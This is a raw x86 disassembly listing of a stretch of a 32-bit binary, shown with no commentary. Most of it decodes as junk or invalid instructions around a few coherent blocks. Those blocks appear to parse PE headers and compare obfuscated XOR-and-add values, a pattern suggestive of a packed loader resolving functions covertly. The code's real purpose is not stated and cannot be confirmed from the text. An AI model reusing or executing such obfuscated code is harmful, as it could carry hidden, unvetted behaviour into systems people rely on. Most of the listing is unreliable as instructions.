  40f1e7:	iret   
  40f1e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f1e9:	push   es
  40f1ea:	mov    esi,0xd2cd4326
  40f1ef:	xchg   ebp,eax
  40f1f0:	les    esi,FWORD PTR [ebp-0x70ae4d83]
  40f1f6:	pop    ds
  40f1f7:	jo     0x40f1af
  40f1f9:	or     ecx,0x50c92ecd
  40f1ff:	fdivr  st(0),st
  40f201:	fimul  WORD PTR [ebx-0x12]
  40f204:	sahf   
  40f205:	jmp    0x57dded24
  40f20a:	mov    ecx,0x96e5f65f
  40f20f:	jbe    0x40f1b2
  40f211:	imul   ebx,DWORD PTR [edx],0xfffffffb
  40f214:	(bad)  
  40f215:	cli    
  40f216:	mov    ah,0xd3
  40f218:	sar    DWORD PTR [edi+edx*8],1
  40f21b:	push   eax
  40f21c:	jmp    0x7081f2cc
  40f221:	ret    0x9fbb
  40f224:	mov    bl,0x1b
  40f226:	push   ebp
  40f227:	and    dl,BYTE PTR [edx-0x3f7a24c4]
  40f22d:	push   es
  40f22e:	repz xchg bh,cl
  40f231:	cli    
  40f232:	imul   DWORD PTR [esi-0x37]
  40f235:	and    DWORD PTR [eax+0x6ea5f527],esi
  40f23b:	sub    ebx,0x82669d6f
  40f241:	scas   eax,DWORD PTR es:[edi]
  40f242:	fild   DWORD PTR [eax-0x10]
  40f245:	lea    ebp,[edi*2+0x7d2a69b0]
  40f24c:	out    dx,al
  40f24d:	lock jp 0x40f1e1
  40f250:	lds    edi,FWORD PTR [ebp+0x51]
  40f253:	inc    edx
  40f254:	pusha  
  40f255:	iret   
  40f256:	and    ebx,ebx
  40f258:	call   0x49730121
  40f25d:	repnz dec edx
  40f25f:	add    eax,0x33754b59
  40f264:	sbb    ah,BYTE PTR [esi+edx*8]
  40f267:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f268:	or     DWORD PTR [edi+0x7a],ebp
  40f26b:	add    ah,bh
  40f26d:	xchg   ebp,eax
  40f26e:	mov    al,BYTE PTR [edi]
  40f270:	xlat   BYTE PTR ds:[ebx]
  40f271:	loope  0x40f29d
  40f273:	pop    eax
  40f274:	xchg   edx,eax
  40f275:	ficom  WORD PTR [esi-0x4b]
  40f278:	pop    ecx
  40f279:	fistp  WORD PTR [eax-0x2c448fc]
  40f27f:	fld    TBYTE PTR [ebx+0x7437ce5d]
  40f285:	jno    0x40f259
  40f287:	(bad)  
  40f288:	cld    
  40f289:	and    dh,BYTE PTR [edi-0x68]
  40f28c:	ja     0x40f24f
  40f28e:	push   esp
  40f28f:	mov    eax,ds:0x7135f6f3
  40f294:	pop    eax
  40f295:	lea    edx,[edx-0x3e]
  40f298:	mov    cl,0x9c
  40f29a:	inc    esp
  40f29b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f29c:	xor    cl,BYTE PTR [ebx]
  40f29e:	cmc    
  40f29f:	or     DWORD PTR [ebp+0x59],ecx
  40f2a2:	adc    al,0x46
  40f2a4:	jecxz  0x40f27b
  40f2a6:	fidiv  WORD PTR [edx+edi*8+0x660c1e93]
  40f2ad:	mov    dl,0x83
  40f2af:	or     dh,BYTE PTR [ecx-0x4e]
  40f2b2:	jmp    0x40f257
  40f2b4:	leave  
  40f2b5:	push   0xffffffb9
  40f2b7:	and    al,0x5a
  40f2b9:	adc    BYTE PTR [ebx],dl
  40f2bb:	adc    al,0xc2
  40f2bd:	jge    0x40f2af
  40f2bf:	pop    es
  40f2c0:	xor    DWORD PTR [ebx+eiz*1-0x38d0d01a],esp
  40f2c7:	add    BYTE PTR [ecx-0x169fcbe2],cl
  40f2cd:	in     eax,0x4
  40f2cf:	add    BYTE PTR [eax],al
  40f2d1:	mov    eax,DWORD PTR [ebp+0x8]
  40f2d4:	mov    ecx,DWORD PTR [ebp-0x8]
  40f2d7:	xor    eax,esi
  40f2d9:	add    eax,edi
  40f2db:	cmp    DWORD PTR [ecx],eax
  40f2dd:	je     0x40f79e
  40f2e3:	mov    ecx,DWORD PTR [ebp-0x18]
  40f2e6:	jmp    0x40f450
  40f2eb:	dec    ebx
  40f2ec:	int3   
  40f2ed:	cmp    esi,ecx
  40f2ef:	mov    ecx,0x99494bcd
  40f2f4:	add    dh,ch
  40f2f6:	ror    bh,1
  40f2f8:	cwde   
  40f2f9:	fcom   QWORD PTR [eax+0x76]
  40f2fc:	test   eax,0x7fc37070
  40f301:	jo     0x40f373
  40f303:	test   DWORD PTR [edx-0x2a],esi
  40f306:	mov    bh,BYTE PTR es:[esi-0x59727af7]
  40f30d:	sub    cl,BYTE PTR [ecx+0xf]
  40f310:	fisub  DWORD PTR [esi]
  40f312:	lds    edx,FWORD PTR ds:0xcd36e375
  40f318:	mov    ebp,0x523f9af7
  40f31d:	sti    
  40f31e:	ret    
  40f31f:	pop    edi
  40f320:	daa    
  40f321:	dec    ebp
  40f322:	pop    esp
  40f323:	enter  0x3825,0x4c
  40f327:	repnz cmc 
  40f329:	adc    al,BYTE PTR [esi-0x45]
  40f32c:	xchg   esp,eax
  40f32d:	cmc    
  40f32e:	test   BYTE PTR [edi],dl
  40f330:	inc    edx
  40f331:	mov    esp,0x83e7b929
  40f336:	sub    al,BYTE PTR [edi+0x10]
  40f339:	cmc    
  40f33a:	mov    al,ds:0x7ed5d391
  40f33f:	stos   BYTE PTR es:[edi],al
  40f340:	dec    ecx
  40f341:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f342:	cmp    al,BYTE PTR [ecx-0x73]
  40f345:	mov    ch,0x54
  40f347:	jmp    0x91d11d75
  40f34c:	jp     0x40f34f
  40f34e:	fwait
  40f34f:	or     eax,0x1ca3c871
  40f354:	sub    ebx,DWORD PTR [eax-0x25]
  40f357:	fild   QWORD PTR [eax+0x9]
  40f35a:	jle    0x40f3c2
  40f35c:	ret    
  40f35d:	dec    eax
  40f35e:	int    0xc
  40f360:	sbb    DWORD PTR fs:[edi-0x26],eax
  40f364:	dec    eax
  40f365:	cmp    ch,BYTE PTR [ecx]
  40f367:	dec    esp
  40f368:	mov    ebx,0x9cd1f951
  40f36d:	cli    
  40f36e:	xor    al,0x20
  40f370:	and    al,0xad
  40f372:	xchg   esp,eax
  40f373:	or     al,0xb4
  40f375:	adc    DWORD PTR [ecx],edx
  40f377:	clc    
  40f378:	sti    
  40f379:	jecxz  0x40f3eb
  40f37b:	jmp    0xe1fa:0xd59823ae
  40f382:	push   es
  40f383:	or     DWORD PTR [ebp+0x1570b72a],esp
  40f389:	and    esp,DWORD PTR [esi]
  40f38b:	sbb    al,0xc0
  40f38d:	(bad)  
  40f38e:	pop    ecx
  40f38f:	add    BYTE PTR [ebx-0x53],dl
  40f392:	ret    0xe548
  40f395:	retf   0x83b7
  40f398:	fwait
  40f399:	imul   ah
  40f39b:	mov    ecx,0xcbfe974
  40f3a0:	out    0x43,eax
  40f3a2:	dec    eax
  40f3a3:	js     0x40f420
  40f3a5:	scas   eax,DWORD PTR es:[edi]
  40f3a6:	test   esi,esi
  40f3a8:	sub    DWORD PTR [eax+0x56],0xfffffff9
  40f3ac:	push   cs
  40f3ad:	sub    BYTE PTR [eax+0x19],al
  40f3b0:	ins    BYTE PTR es:[edi],dx
  40f3b1:	jns    0x40f3f7
  40f3b3:	ret    
  40f3b4:	xor    edx,DWORD PTR [ecx]
  40f3b6:	adc    BYTE PTR [ebx],bh
  40f3b8:	clc    
  40f3b9:	rcl    BYTE PTR [edx-0x1b57f690],1
  40f3bf:	mov    ebx,0x6fc9008d
  40f3c4:	pop    edx
  40f3c5:	adc    dl,BYTE PTR [ecx-0x5a0ad134]
  40f3cb:	std    
  40f3cc:	fist   DWORD PTR [ebx-0x63]
  40f3cf:	ss dec esp
  40f3d1:	dec    BYTE PTR [edx-0x3b]
  40f3d4:	data16 ffreep st(0)
  40f3d7:	cwde   
  40f3d8:	jmp    DWORD PTR [ebx+ebx*4]
  40f3db:	jecxz  0x40f403
  40f3dd:	mov    ah,0x24
  40f3df:	push   0xbc39aa57
  40f3e4:	lds    ebx,FWORD PTR [ebp-0x11]
  40f3e7:	fs or  al,0x56
  40f3ea:	dec    edx
  40f3eb:	out    dx,al
  40f3ec:	test   BYTE PTR [ebp-0x5e987917],dh
  40f3f2:	popa   
  40f3f3:	sub    DWORD PTR [ecx+0x6a],0xe9b79430
  40f3fa:	test   eax,0x622445ee
  40f3ff:	mov    WORD PTR [esi-0x4cb6c576],cs
  40f405:	retf   
  40f406:	jg     0x40f3c7
  40f408:	push   ecx
  40f409:	and    al,0xc1
  40f40b:	jo     0x40f3f8
  40f40d:	mov    ebp,0x7d830926
  40f412:	and    esp,DWORD PTR [edi]
  40f414:	jle    0x40f41a
  40f416:	add    esi,edx
  40f418:	add    dl,BYTE PTR [ebp+0x12]
  40f41b:	(bad)  
  40f41c:	pusha  
  40f41d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f41e:	dec    edi
  40f41f:	and    esp,eax
  40f421:	arpl   cx,sp
  40f423:	xchg   BYTE PTR [ebp+0x32],bh
  40f426:	cmc    
  40f427:	and    ch,BYTE PTR [ebp+ebp*2+0x13]
  40f42b:	fstp   DWORD PTR [eax+0x2a6937c7]
  40f431:	js     0x40f3ee
  40f433:	mov    ebx,0xac76d421
  40f438:	inc    eax
  40f439:	js     0x40f4a4
  40f43b:	jo     0x40f42c
  40f43d:	pushf  
  40f43e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f43f:	test   DWORD PTR [esi],ecx
  40f441:	cmc    
  40f442:	pop    esp
  40f443:	push   ds
  40f444:	sub    edx,DWORD PTR [edi+eax*2+0x27]
  40f448:	mov    ah,0x11
  40f44a:	mov    eax,ds:0x6bc11d2
  40f44f:	push   edi
  40f450:	mov    eax,DWORD PTR [ebp-0x8]
  40f453:	jmp    0x40f5bd
  40f458:	inc    eax
  40f459:	gs ror ch,cl
  40f45c:	icebp  
  40f45d:	imul   edx,DWORD PTR [ebx+0x65],0x2966c4cb
  40f464:	sub    al,0x5f
  40f466:	pusha  
  40f467:	pusha  
  40f468:	cmp    DWORD PTR [edi+0x7fc37070],esi
  40f46e:	jo     0x40f4e0
  40f470:	icebp  
  40f471:	addr16 pop eax
  40f473:	dec    edi
  40f474:	cmp    esp,edi
  40f476:	nop
  40f477:	and    cl,BYTE PTR [ebx+0x1c]
  40f47a:	jns    0x40f464
  40f47c:	jle    0x40f4a4
  40f47e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f47f:	inc    eax
  40f480:	cmp    DWORD PTR [ebx+0x654edcfc],ebp
  40f486:	mov    ecx,0xfcd21f31
  40f48b:	push   es
  40f48c:	sbb    DWORD PTR [edx+0x7f],0x53
  40f490:	inc    edi
  40f491:	and    al,BYTE PTR [ebx+edi*1-0x61]
  40f495:	ja     0x40f4f9
  40f497:	mov    edx,0xeecf7608
  40f49c:	jge    0x40f4b7
  40f49e:	icebp  
  40f49f:	push   esi
  40f4a0:	neg    DWORD PTR [ebx+0x19c8c6fa]
  40f4a6:	pop    edx
  40f4a7:	pop    eax
  40f4a8:	sar    DWORD PTR [edi+0x32d86011],0x26
  40f4af:	arpl   WORD PTR [ebx],bx
  40f4b1:	cmp    DWORD PTR [edi+0x66],ebp
  40f4b4:	daa    
  40f4b5:	idiv   eax
  40f4b7:	clc    
  40f4b8:	ja     0x40f50d
  40f4ba:	xor    DWORD PTR [esi-0x2],esp
  40f4bd:	xchg   BYTE PTR gs:[ebp+0x437c56d6],al
  40f4c4:	test   al,0x80
  40f4c6:	aas    
  40f4c7:	fwait
  40f4c8:	mov    edx,0xf64ced5e
  40f4cd:	mov    edi,0x8d8aacd2
  40f4d2:	loop   0x40f4b6
  40f4d4:	xchg   ecx,eax
  40f4d5:	in     eax,dx
  40f4d6:	xor    dh,al
  40f4d8:	pop    esi
  40f4d9:	mov    es,edx
  40f4db:	pop    edx
  40f4dc:	dec    ebx
  40f4dd:	jg     0x40f51c
  40f4df:	je     0x40f51d
  40f4e1:	ins    BYTE PTR es:[edi],dx
  40f4e2:	sti    
  40f4e3:	mov    bl,0xa8
  40f4e5:	mov    esi,0xf156a344
  40f4ea:	push   esi
  40f4eb:	mov    al,0xfe
  40f4ed:	or     esp,DWORD PTR [ecx]
  40f4ef:	lea    esp,[ebx+0x34ed0506]
  40f4f5:	jo     0x40f4a0
  40f4f7:	or     bh,BYTE PTR [esi+0x7279663f]
  40f4fd:	fiadd  DWORD PTR [ebx+0x60]
  40f500:	in     eax,0x41
  40f502:	mov    ds:0x3198eddb,eax
  40f507:	inc    eax
  40f508:	stos   BYTE PTR es:[edi],al
  40f509:	push   ebp
  40f50a:	shr    ebp,cl
  40f50c:	push   ds
  40f50d:	push   eax
  40f50e:	fnstenv [edi-0x9]
  40f511:	cmp    eax,0xe348d698
  40f516:	retf   0x69cd
  40f519:	imul   ecx,DWORD PTR [esi+ebp*1-0xb793bf0],0x7
  40f521:	sub    bh,bh
  40f523:	jle    0x40f4d0
  40f525:	push   edx
  40f526:	cmp    DWORD PTR [eax+0x89bcff],esp
  40f52c:	inc    esp
  40f52d:	cs test al,0xd6
  40f530:	(bad)  
  40f531:	outs   dx,DWORD PTR ds:[esi]
  40f532:	or     DWORD PTR [ebx-0x4b05415a],eax
  40f538:	jnp    0x40f502
  40f53a:	dec    eax
  40f53b:	xor    eax,0x7990f7a2
  40f540:	add    eax,0x6581664a
  40f545:	push   ds
  40f546:	stos   BYTE PTR es:[edi],al
  40f547:	adc    BYTE PTR [ecx-0x7f],bl
  40f54a:	mov    ?,ebx
  40f54c:	(bad)  
  40f54e:	call   0xade1ce7f
  40f553:	xchg   DWORD PTR [eax],eax
  40f555:	call   0x8cda:0x35334aca
  40f55c:	lods   eax,DWORD PTR ds:[esi]
  40f55d:	or     ebx,esp
  40f55f:	lock xchg ecx,eax
  40f561:	sti    
  40f562:	icebp  
  40f563:	jno    0x40f557
  40f565:	or     bl,BYTE PTR [eax-0x77]
  40f568:	mov    ch,0x62
  40f56a:	add    esp,0xffffff82
  40f56d:	mov    bl,ch
  40f56f:	adc    esi,DWORD PTR ds:0x93c8aa6a
  40f575:	lods   eax,DWORD PTR ds:[esi]
  40f576:	adc    dh,bl
  40f578:	mov    edx,ebp
  40f57a:	ja     0x40f4fd
  40f57c:	sbb    BYTE PTR [esi],ch
  40f57e:	push   esp
  40f57f:	div    DWORD PTR [ecx+0xfe5636d]
  40f585:	repz hlt 
  40f587:	xor    eax,DWORD PTR ds:0x6afbcc3f
  40f58d:	loop   0x40f559
  40f58f:	add    eax,0x5c82732e
  40f594:	jne    0x40f544
  40f596:	int3   
  40f597:	cli    
  40f598:	add    eax,0x51420dae
  40f59d:	test   eax,0xc5297a7
  40f5a2:	in     al,0xc0
  40f5a4:	or     BYTE PTR [esi+0x42],al
  40f5a7:	test   al,0xa3
  40f5a9:	and    al,al
  40f5ab:	repz jns 0x40f5a0
  40f5ae:	dec    eax
  40f5af:	mov    al,ds:0x63277682
  40f5b4:	js     0x40f622
  40f5b6:	icebp  
  40f5b7:	lods   eax,DWORD PTR ds:[esi]
  40f5b8:	and    bl,bl
  40f5ba:	mov    ebp,0x8b8d1d
  40f5bf:	mov    eax,DWORD PTR [eax+0x3c]
  40f5c2:	lea    ecx,[ecx*8+0x78]
  40f5c9:	add    eax,ecx
  40f5cb:	mov    ecx,DWORD PTR [ebp-0x8]
  40f5ce:	mov    ecx,DWORD PTR [ecx]
  40f5d0:	mov    eax,DWORD PTR [eax+ecx*1]
  40f5d3:	mov    DWORD PTR [ebp-0x20],eax
  40f5d6:	mov    eax,DWORD PTR [ebp+0x8]
  40f5d9:	xor    eax,esi
  40f5db:	add    eax,edi
  40f5dd:	mov    DWORD PTR [ebp-0x24],eax
  40f5e0:	mov    eax,DWORD PTR [ebp+0x8]
  40f5e3:	mov    ecx,DWORD PTR [ebp-0x20]
  40f5e6:	xor    eax,esi
  40f5e8:	add    eax,edi
  40f5ea:	cmp    ecx,eax
  40f5ec:	je     0x40f7b6
  40f5f2:	jmp    0x40f75c
  40f5f7:	pop    ebx
  40f5f8:	out    dx,al
  40f5f9:	dec    ebp
  40f5fa:	mov    bl,0x49
  40f5fc:	mov    bl,0x61
  40f5fe:	test   BYTE PTR [edx+0xc],0x5a
  40f602:	dec    ebx
  40f603:	not    DWORD PTR [edx+ebp*1+0x17]
  40f607:	mov    WORD PTR [esi+0x7fc37070],?
  40f60d:	jo     0x40f67f
  40f60f:	popf   
  40f610:	scas   eax,DWORD PTR es:[edi]
  40f611:	lods   al,BYTE PTR ds:[esi]
  40f612:	je     0x40f62b
  40f614:	(bad)  
  40f615:	and    ebp,eax
  40f617:	xor    al,0x3b
  40f619:	add    dl,dh
  40f61b:	mov    al,ds:0x35a2f074
  40f620:	lahf   
  40f621:	inc    edx
  40f622:	xchg   edx,eax
  40f623:	and    al,0x5d
  40f625:	mov    ch,0x52
  40f627:	xchg   esp,eax
  40f628:	fwait
  40f629:	data16 into 
  40f62b:	iret   
  40f62c:	pop    es
  40f62d:	lods   eax,DWORD PTR ds:[esi]
  40f62e:	out    0x23,al
  40f630:	gs mov dh,0xb5
  40f633:	pop    esi
  40f634:	mov    WORD PTR [ebx],?
  40f636:	adc    eax,0xfbaa4f0d
  40f63b:	xor    dh,ch
  40f63d:	loopne 0x40f67a
  40f63f:	std    
  40f640:	pop    DWORD PTR [esi-0x14]
  40f643:	retf   0xda6
  40f646:	add    al,0x4
  40f648:	out    0xae,al
  40f64a:	pusha  
  40f64b:	cmp    al,0x8a
  40f64d:	sahf   
  40f64e:	and    ebx,esi
  40f650:	fisttp DWORD PTR [ecx-0x69]
  40f653:	aam    0x7e
  40f655:	push   0xffffffb3
  40f657:	pop    esi
  40f658:	add    eax,0xb78cb5
  40f65d:	pusha  
  40f65e:	jb     0x40f6cd
  40f660:	in     al,dx
  40f661:	std    
  40f662:	(bad)  
  40f663:	out    0x57,al
  40f665:	or     DWORD PTR [ebx+0x7d],0xffffff8c
  40f669:	mov    esi,0xaac3dce7
  40f66e:	sbb    BYTE PTR [esi],bh
  40f670:	ins    WORD PTR es:[edi],dx
  40f672:	push   cs
  40f673:	xchg   edi,eax
  40f674:	fadd   QWORD PTR [edi-0x69]
  40f677:	gs gs mov edi,0xbf4858c4
  40f67e:	inc    esp
  40f67f:	cmp    cl,BYTE PTR [edx+0xf]
  40f682:	mov    esi,0x5f6ae19d
  40f687:	scas   al,BYTE PTR es:[edi]
  40f688:	fmul   QWORD PTR [edx]
  40f68a:	lods   al,BYTE PTR ds:[esi]
  40f68b:	jle    0x40f686
  40f68d:	rcl    BYTE PTR [edi-0x10],cl
  40f690:	jge    0x40f6e2
  40f692:	mov    WORD PTR [edx+0x3d6fbc81],?
  40f698:	mov    esi,0xdb5f44bc
  40f69d:	std    
  40f69e:	aad    0x61
  40f6a0:	xor    eax,0x1bf0afab
  40f6a5:	ret    0xaaf0
  40f6a8:	xchg   ecx,eax
  40f6a9:	inc    edx
  40f6aa:	sub    ch,bl
  40f6ac:	push   0x8c1ea1d
  40f6b1:	mov    es,WORD PTR [edi+0x167a2ea6]
  40f6b7:	sbb    DWORD PTR [eax-0x11],0xf921895a
  40f6be:	out    0xec,al
  40f6c0:	leave  
  40f6c1:	lea    edx,[edx-0x6270fd3d]
  40f6c7:	jae    0x40f6e2
  40f6c9:	and    al,0x88
  40f6cb:	dec    edx
  40f6cc:	out    dx,al
  40f6cd:	out    0xb9,eax
  40f6cf:	push   ecx
  40f6d0:	into   
  40f6d1:	lods   al,BYTE PTR ds:[esi]
  40f6d2:	add    BYTE PTR [ecx-0x20],al
  40f6d5:	lods   ax,WORD PTR ds:[esi]
  40f6d7:	repz sti 
  40f6d9:	(bad)  
  40f6da:	pop    es
  40f6db:	out    dx,eax
  40f6dc:	(bad)  
  40f6dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f6de:	jbe    0x40f6e0
  40f6e0:	enter  0x7676,0xb0
  40f6e4:	add    BYTE PTR [esi+0x18],cl
  40f6e7:	push   ebp
  40f6e8:	xor    ch,BYTE PTR [edi]
  40f6ea:	xor    eax,0x39709412
  40f6ef:	dec    esi
  40f6f0:	push   0xffffffe5
  40f6f2:	add    eax,0xe233d7e8
  40f6f7:	add    DWORD PTR [edx+0x1e3341ad],eax
  40f6fd:	shl    DWORD PTR [ebp-0x5a],cl
  40f700:	es call 0x51632c94
  40f706:	sbb    BYTE PTR [esi],ch
  40f708:	test   al,0x73
  40f70a:	or     al,0x6d
  40f70c:	pop    esp
  40f70d:	das    
  40f70e:	pop    ebp
  40f70f:	mov    ch,0x1
  40f711:	ins    DWORD PTR es:[edi],dx
  40f712:	bound  esp,QWORD PTR [edi+edi*8-0x6f]
  40f716:	push   es
  40f717:	mov    ds:0x97d10b1d,al
  40f71c:	mov    WORD PTR [esi],gs
  40f71e:	push   esi
  40f71f:	push   esp
  40f720:	lods   eax,DWORD PTR ds:[esi]
  40f721:	pop    es
  40f722:	pop    ebx
  40f723:	jae    0x40f71b
  40f725:	popa   
  40f726:	mov    esi,0x74bef894
  40f72b:	ins    BYTE PTR es:[edi],dx
  40f72c:	push   ds
  40f72d:	or     BYTE PTR [eax],bh
  40f72f:	nop
  40f730:	ror    DWORD PTR [edi-0x46c183b4],cl
  40f736:	cmp    al,0x14
  40f738:	test   DWORD PTR [ebp+eiz*8+0x7127c984],ebx
  40f73f:	ficom  DWORD PTR [edx]
  40f741:	nop
  40f742:	pop    edx
  40f743:	ja     0x40f7b0
  40f745:	lahf   
  40f746:	dec    esi
  40f747:	mov    al,ds:0xad94cd6d
  40f74c:	cmp    BYTE PTR [ebp-0x3f],cl
  40f74f:	je     0x40f762
  40f751:	inc    esp
  40f752:	dec    edx
  40f753:	or     eax,0x3426916b
  40f758:	(bad)  
  40f759:	or     al,0x8b
  40f75b:	stos   BYTE PTR es:[edi],al
  40f75c:	mov    eax,DWORD PTR [ebp-0x8]
  40f75f:	mov    ecx,DWORD PTR [ebp-0x20]
  40f762:	add    ecx,DWORD PTR [eax]
  40f764:	mov    DWORD PTR [ebp-0x24],ecx
  40f767:	mov    eax,DWORD PTR [ebp-0x24]
  40f76a:	mov    ecx,DWORD PTR [ebp-0x8]
  40f76d:	mov    eax,DWORD PTR [eax+0xc]
  40f770:	mov    ecx,DWORD PTR [ecx]
  40f772:	mov    al,BYTE PTR [eax+ecx*1]
  40f775:	add    al,0x37
  40f777:	xor    al,0x47
  40f779:	cmp    al,0xc5
  40f77b:	je     0x40f792
  40f781:	mov    eax,DWORD PTR [ebp+0x8]
  40f784:	mov    ecx,DWORD PTR [ebp-0x8]
  40f787:	xor    eax,esi
  40f789:	add    eax,edi
  40f78b:	mov    DWORD PTR [ecx],eax
  40f78d:	jmp    0x40f7b6
  40f792:	xor    DWORD PTR [ebp-0xc],0x5fd8f
  40f799:	jmp    0x40f7b6
  40f79e:	mov    eax,DWORD PTR [ebp-0x8]
  40f7a1:	mov    ecx,DWORD PTR [ebp-0x1c]
  40f7a4:	mov    ecx,DWORD PTR [ecx]
  40f7a6:	mov    DWORD PTR [eax],ecx
  40f7a8:	mov    eax,DWORD PTR [ebp+0xc]
  40f7ab:	mov    eax,DWORD PTR [ebp+0x8]
  40f7ae:	push   DWORD PTR [ebp-0x8]
  40f7b1:	call   0x401000
  40f7b6:	mov    eax,DWORD PTR [ebp-0xc]
  40f7b9:	cmp    eax,ebx
  40f7bb:	je     0x40e863
  40f7c1:	mov    eax,DWORD PTR [ebp-0x8]
  40f7c4:	mov    eax,DWORD PTR [eax]
  40f7c6:	pop    edi
  40f7c7:	pop    esi
  40f7c8:	pop    ebx
  40f7c9:	leave  
  40f7ca:	ret    0x8
  40f7cd:	push   ebp
  40f7ce:	mov    ebp,esp
  40f7d0:	jmp    0x40fb9a
  40f7d5:	ds cmp al,0x79
  40f7d8:	adc    BYTE PTR [ecx-0x23],bh
  40f7db:	(bad)  
  40f7dd:	dec    ebp
  40f7de:	xor    eax,0x3b8746f3
  40f7e3:	sar    BYTE PTR [edi+ebx*2],0xb5
  40f7e7:	jo     0x40f859
  40f7e9:	mov    ds:0x2b70707d,eax
  40f7ee:	inc    esp
  40f7ef:	pop    ds
  40f7f0:	xor    edx,DWORD PTR [ecx+0x70]
  40f7f3:	dec    ebp
  40f7f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f7f5:	add    ebx,edi
  40f7f7:	push   ss
  40f7f8:	fst    DWORD PTR [edx+0x55]
  40f7fb:	sti    
  40f7fc:	jge    0x40f7a3
  40f7fe:	test   al,0xc8
  40f800:	dec    edi
  40f801:	mov    bl,0x1
  40f803:	jmp    0xc68ca16a
  40f808:	push   ss
  40f809:	xor    BYTE PTR [esp+eiz*4+0x2c],cl
  40f80d:	imul   esp,DWORD PTR [eax],0xf43c1777
  40f813:	enter  0x2fce,0x27
  40f817:	pop    ds
  40f818:	cli    
  40f819:	test   DWORD PTR [eax+eax*4+0x8],esp
  40f81d:	rcl    BYTE PTR [ebx],0x3c
  40f820:	xchg   edi,eax
  40f821:	xchg   esi,eax
  40f822:	sbb    BYTE PTR [edx],cl
  40f824:	popf   
  40f825:	inc    ebx
  40f826:	std    
  40f827:	std    
  40f828:	xor    DWORD PTR [edi-0x57451bd6],ebp
  40f82e:	mov    cl,0x6
  40f830:	mov    ah,0x5b
  40f832:	sub    DWORD PTR [ecx+0x4cc3f5c5],0x32147e10
  40f83c:	jp     0x40f816
  40f83e:	inc    esp
  40f83f:	popf   
  40f840:	test   BYTE PTR [ebx-0x6f],dl
  40f843:	mov    ah,0xbb
  40f845:	int    0xea
  40f847:	xor    edx,DWORD PTR ds:0x8be23b10
  40f84d:	mov    ecx,?
  40f84f:	sbb    DWORD PTR [eax+0x4c],ecx
  40f852:	(bad)  
  40f853:	lods   al,BYTE PTR ds:[esi]
  40f854:	imul   ebx,DWORD PTR [edx+0x72]
  40f858:	inc    ecx
  40f859:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f85a:	xchg   DWORD PTR [ecx],eax
  40f85c:	jbe    0x40f81e
  40f85e:	cmp    DWORD PTR [edx-0x6c2baa51],esp
  40f864:	jle    0x40f8cf
  40f866:	jmp    0x901d:0xb692dce4
  40f86d:	sahf   
  40f86e:	imul   edi,DWORD PTR [eax+0x5b18f267],0xffffffc9
  40f875:	adc    DWORD PTR [eax-0x24],eax
  40f878:	cdq    
  40f879:	mov    ss,ebx
  40f87b:	jmp    0x1fee53a1
  40f880:	(bad)  [edi+ebx*4]
  40f883:	call   0x3efe:0x5604dd25
  40f88a:	adc    ebp,ecx
  40f88c:	jmp    0x1ff95ab
  40f891:	sahf   
  40f892:	fisttp WORD PTR [esi-0x71]
  40f895:	cwde   
  40f896:	fdiv   DWORD PTR [edi-0x54]
  40f899:	fucomi st,st(2)
  40f89b:	loope  0x40f8cc
  40f89d:	jo     0x40f835
  40f89f:	inc    edx
  40f8a0:	out    0x9,eax
  40f8a2:	mov    cl,0xce
  40f8a4:	pop    ds
  40f8a5:	mov    bl,0xe4
  40f8a7:	shr    DWORD PTR [edi-0x54],0x2
  40f8ab:	fwait
  40f8ac:	call   0xebde8a8b
  40f8b1:	jb     0x40f902
  40f8b3:	stos   BYTE PTR es:[edi],al
  40f8b4:	jmp    0x40f8c6
  40f8b6:	push   ebp
  40f8b7:	mov    dh,0xc1
  40f8b9:	mov    ds:0x596a325d,eax
  40f8be:	push   ds
  40f8bf:	ror    bh,1
  40f8c1:	cmp    BYTE PTR [edx],bl
  40f8c3:	fisttp WORD PTR [edx]
  40f8c5:	not    ch
  40f8c7:	xlat   BYTE PTR ds:[ebx]
  40f8c8:	pop    ds
  40f8c9:	test   ecx,eax
  40f8cb:	stos   DWORD PTR es:[edi],eax
  40f8cc:	sub    bh,dh
  40f8ce:	xchg   DWORD PTR [edi],edx
  40f8d0:	jbe    0x40f885
  40f8d2:	xor    BYTE PTR [esi-0x7f],ah
  40f8d5:	push   0xa0e876c
  40f8da:	push   edx
  40f8db:	lods   eax,DWORD PTR ds:[esi]
  40f8dc:	sar    ah,0xef
  40f8df:	mov    ch,0x9
  40f8e1:	test   edx,0xb1845ad9
  40f8e7:	mov    eax,0x575f71c0
  40f8ec:	inc    esp
  40f8ed:	(bad)  
  40f8ee:	cmp    BYTE PTR [ebp+0x37],bh
  40f8f1:	mov    cl,0x4f
  40f8f3:	sahf   
  40f8f4:	clc    
  40f8f5:	out    dx,al
  40f8f6:	fisubr WORD PTR [ebx+0x0]
  40f8f9:	xchg   ebx,eax
  40f8fa:	icebp  
  40f8fb:	sub    DWORD PTR [eax],eax
  40f8fd:	xchg   BYTE PTR ds:0x970f5b0a,dl
  40f903:	sub    eax,0x37234093
  40f908:	xchg   esp,eax
  40f909:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  40f90b:	or     al,BYTE PTR [eax-0x4c]
  40f90e:	loop   0x40f8bb
  40f910:	jmp    0x61a23a19
  40f915:	sbb    cl,0xc9
  40f918:	dec    eax
  40f919:	lock mov ebx,0xfdd4ace5
  40f91f:	(bad)  
  40f920:	jl     0x40f8c3
  40f922:	mov    edi,0x770d44b9
  40f927:	push   es
  40f928:	sbb    DWORD PTR [eax],0xe799340b
  40f92e:	test   BYTE PTR [ebx-0x6d9f9dd5],bl
  40f934:	loopne 0x40f942
  40f936:	sub    eax,DWORD PTR [ebx-0x68]
  40f939:	xchg   edx,eax
  40f93a:	mov    ch,0x44
  40f93c:	inc    esi
  40f93d:	je     0x40f92f
  40f93f:	divsd  xmm6,xmm5
  40f943:	and    cl,BYTE PTR [ecx-0x9fc33af]
  40f949:	mov    al,ds:0x19cc81d0
  40f94e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
